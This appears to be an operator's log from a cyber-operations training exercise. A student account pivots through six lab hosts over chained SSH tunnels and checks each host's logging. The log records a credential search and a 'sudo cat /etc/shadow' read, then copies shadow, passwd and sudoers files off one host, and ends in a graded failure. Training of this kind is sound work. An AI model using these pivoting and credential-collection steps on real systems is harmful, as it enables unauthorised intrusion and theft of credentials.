@@ -1,0 +1,235 @@
+Date: 2024-05-07
+Start time: 0900
+End time: 1500
+
+------------------------
+SOM
+------------------------
+> T1: 10.50.24.145
+-> T2: 10.145.117.10
+--> T3: 10.145.117.16
+---> T4: 192.169.117.200
+---> T5: 192.169.117.201
+----> T6: 129.168.117.54
+------------------------
+Creds
+------------------------
+student14
+
+password14
+=========================
+T1: 10.50.24.145
+=========================
+X-----------------------
+2024-05-07 09:01:06-- connection to T1; start vetting
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@10.50.24.145 -p 22011
+password14
+
+fa:16:3e:27:5e:f5
+10.50.24.145/10.145.117.86
+2024-05-07 09:02:33-- date
+Tue May  7 13:02:29 UTC 2024
+Tue May  7 13:02:29 UTC 2024
+Linux dryruns-ext-rtr.novalocal 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+4 S root        5226       1  0  80   0 - 77732 -      Apr29 ?        00:00:31   /usr/sbin/rsyslogd -n
+-rw-r--r--.  1 root   root     18085 May  7 13:02 cron
+-rw-rw-r--.  1 root   utmp     35712 May  7 13:03 wtmp
+-rw-rw-r--.  1 root   utmp    299008 May  7 13:03 lastlog
+-rw-------.  1 root   root    101874 May  7 13:03 messages
+-rw-------.  1 root   root    542063 May  7 13:04 secure
+/var/log/audit/audit.log
+/etc/rsyslog.conf
+*.* @@10.49.1.4:514
+tcp SYN-SENT   10.145.117.86:52218    10.49.1.4:514         users:(("rsyslogd",pid=5226,fd=9))
+
+
+2024-05-07 09:13:48-- vetting complete; redirecting
+2024-05-07 13:07:19-- start exit vetting
+2024-05-07 13:08:06-- exit vetting complete; disconnect from T1
+
+Logged In: wtmp, lastlog, messages, secure, audit.log, rsyslog, utmp
+------------------------X
+=========================
+
+=========================
+T2: 10.145.117.10
+=========================
+X-----------------------
+2024-05-07 09:14:36-- connection to T2; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2002:10.145.117.10:22012 dummy
+ssh -MS /tmp/T2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -p 2002
+password14
+
+FA-16-3E-81-48-A3
+10.145.117.10
+2024-05-07 09:15:43-- date
+Tue 05/07/2024
+01:15 PM
+administrator         console             1  Active      none   5/7/2024 12:47 PM
+LogFusion.exe                 7748 Console                    1    135,440 K Unknown         DESKTOP-T10ALAC\Administrator                           0:00:11 N/A
+C:\Program Files\LogFusion\LogFusion.exe                                                                          4812             7748
+runonce
+!BCILauncher    REG_SZ    "C:\windows\Temp\MUBSTemp\BCILauncher.EXE" bgaupmi=1D62EFE03E2C4DA29BD3960774B69BA3
+c:\lf.exe
+2024-05-07 10:09:19-- vetting complete; cred search
+collect
+75fea08a5620f23fc3f2d6adb3d7d694  thesecredsshouldwork.config - Local 48 bytes
+75fea08a5620f23fc3f2d6adb3d7d694  C:\Users\Administrator\Desktop\thesecredsshouldwork.config - Remote 48 bytes
+student::password
+2024-05-07 10:20:19-- collection complete; redirecting
+2024-05-07 13:04:17-- start exit vetting
+2024-05-07 13:06:48-- exit vetting complete; disconnect from T2
+
+
+Logged In: Security, Application
+------------------------X
+=========================
+
+=========================
+--> T3: 10.145.117.16
+=========================
+X-----------------------
+2024-05-07 10:26:54-- connection to T3; start vetting
+ssh -S /tmp/T2 -O forward -L 127.0.0.1:2003:10.145.117.16:22012 dummy
+ssh -MS /tmp/T3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -p 2003
+password14
+
+eth0:
+fa:16:3e:c7:0e:7b
+10.145.117.16
+eth1:
+fa:16:3e:c0:9d:1d
+192.169.117.198
+
+2024-05-07 10:29:28-- date
+Tue May  7 14:29:21 UTC 2024
+Tue May  7 14:29:21 UTC 2024
+Linux dryruns-int-rtr2.novalocal 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+4 S root         951       1  0  80   0 - 52381 -      Apr29 ?        00:00:22   /usr/sbin/rsyslogd -n
+-rw-rw-r--.  1 root   utmp     6528 May  7 14:29 wtmp
+-rw-rw-r--.  1 root   utmp   299008 May  7 14:29 lastlog
+-rw-------.  1 root   root    38878 May  7 14:29 messages
+-rw-------.  1 root   root    28462 May  7 14:30 secure
+/var/log/audit/audit.log
+2024-05-07 10:39:56-- vetting complete; redirecting
+2024-05-07 13:02:47-- start exit vetting
+2024-05-07 13:03:36-- exit vetting complete; disconnect from T3
+
+
+Logged In: wtmp, utmp, lastlog, messages, secure, audit.log
+------------------------X
+=========================
+
+=========================
+---> T4: 192.169.117.200
+=========================
+X-----------------------
+2024-05-07 10:41:26-- connection to T4; start vetting
+ssh -S /tmp/T3 -O forward -L 127.0.0.1:2004:192.169.117.200:22013 dummy
+ssh -MS /tmp/T4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -p 2004
+password14
+
+fa:16:3e:31:97:97
+192.169.117.200
+2024-05-07 10:43:58-- date
+Tue May  7 14:43:56 UTC 2024
+Tue May  7 14:43:56 UTC 2024
+Linux dryruns-admin2.novalocal 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+4 S root         925       1  0  80   0 - 52381 -      Apr29 ?        00:00:27   /usr/sbin/rsyslogd -n
+/var/account/pacct
+/var/log/audit/audit.log
+
+2024-05-07 11:08:56-- vetting complete; starting survey
+2024-05-07 11:11:38-- survey complete; starting collection
+ssh -S /tmp/T4 dummy "sudo -S cat /etc/shadow" > shadow
+scp -o ControlPath=/tmp/T4 -P 2004 student14@127.0.0.1:"/etc/" .
+e335ce2a78ce546c9fb90416c890b157  /etc/shadow - remote 4k
+e335ce2a78ce546c9fb90416c890b157  T4/shadow - local 4k
+845212e30cafb06f8d1ee40e49b5dd71  /etc/group - remote 4k
+845212e30cafb06f8d1ee40e49b5dd71  T4/group - local 4k
+14aeb765f358fa65012e60a53010d3a8  /etc/passwd - remote 4k
+14aeb765f358fa65012e60a53010d3a8  T4/passwd - local 4k
+2fa79db0f9e55cffc4fa34a566dca4b4  /etc/rsyslog.conf - remote 4k
+2fa79db0f9e55cffc4fa34a566dca4b4  T4/rsyslog.conf - local 4k
+eb59e6ff2c33a17d80f818dc14fa1c68  /etc/sudoers - remote 8k
+eb59e6ff2c33a17d80f818dc14fa1c68  T4/sudoers - local 8k
+
+2024-05-07 11:34:30-- collection complete; start exit vetting
+2024-05-07 11:37:43-- exit vetting complete; disconnect from T4
+
+
+Logged In: wtmp, utmp, secure, messages, audit.log, pacct, lastlog
+------------------------X
+=========================
+
+=========================
+---> T5: 192.169.117.201
+=========================
+X-----------------------
+2024-05-07 11:40:14-- connection to T5; start vetting
+ssh -S /tmp/T3 -O forward -L 127.0.0.1:2005:192.169.117.201:22013 dummy
+ssh -MS /tmp/T5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -p 2005
+password14
+
+fa:16:3e:2e:e0:09
+192.169.117.201
+2024-05-07 11:42:17-- date
+Tue May  7 15:42:15 UTC 2024
+Tue May  7 15:42:15 UTC 2024
+Linux dryruns-targeta 4.15.0-212-generic #223-Ubuntu SMP Tue May 23 13:09:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+TXT on Linux box
+/maytheforcebewithyou.txt - data
+/tmp/file3.txt - data
+/root/file2.txt - data
+4 S root     17751     1  0  80   0 -  5700 -      Apr29 ?        00:00:00   tcpdump -i lo -w /var/log/tcpdump.pcap
+-rw-r-----   1 syslog    adm               16186 May  7 15:45 syslog
+-rw-rw-r--   1 root      utmp               3456 May  7 15:45 wtmp
+-rw-rw-r--   1 root      utmp             299008 May  7 15:45 lastlog
+-rw-r--r--   1 root      root             159744 May  7 15:46 tcpdump.pcap
+-rw-r-----   1 syslog    adm             1156587 May  7 15:46 auth.log
+
+2024-05-07 12:22:39-- vetting complete; redirecting
+2024-05-07 12:58:00-- start exit vetting
+2024-05-07 12:59:58-- exit vetting complete; disconnect from T5
+
+
+Logged In: wtmp, utmp, lastlog, auth.log, syslog
+
+RESULT FAILED: MISSED NONSTANDARD; RSYSLOG
+-----------------------X
+=========================
+
+=========================
+----> T6: 129.168.117.54
+=========================
+X-----------------------
+2024-05-07 12:28:17-- connection to T6; start vetting
+ssh -S /tmp/T5 -O forward -L 127.0.0.1:2006:129.168.117.54:22013 dummy
+ssh -MS /tmp/T6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student14@127.0.0.1 -p 2006
+password14
+
+fa:16:3e:40:04:17
+129.168.117.54
+2024-05-07 12:32:29-- date
+Tue May  7 16:32:28 UTC 2024
+Tue May  7 16:32:28 UTC 2024
+Linux dryruns-targeta-admin.novalocal 4.18.0-519.el8.x86_64 #1 SMP Tue Oct 24 16:44:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+/root/linux-malware-detect
+-rw-rw-r--.  1 root   utmp   299008 May  7 16:28 lastlog
+-rw-rw-r--.  1 root   utmp     8064 May  7 16:32 wtmp
+-rw-------.  1 root   root    49541 May  7 16:32 messages
+-rw-------.  1 root   root    78340 May  7 16:35 secure
+-rw-r--r--.  1 root   root   126043 May  7 16:35 cron
+/var/log/audit/audit.log
+/etc/crontab
+  10  *  *  *  * root maldet -a /bin >> /root/linux-malware-detect/report.txt
+/etc/cron.daily/maldet
+/etc/cron.d/maldet_pub
+/usr/local/sbin/maldet
+
+2024-05-07 12:53:25--vetting complete; conducting survey
+
+2024-05-07 12:55:50-- survey complete; start exit vetting
+2024-05-07 12:57:17-- exit vetting complete; disconnect from T6
+
+Logged in wtmp, utmp, messages, secure, lastlog, audit.log
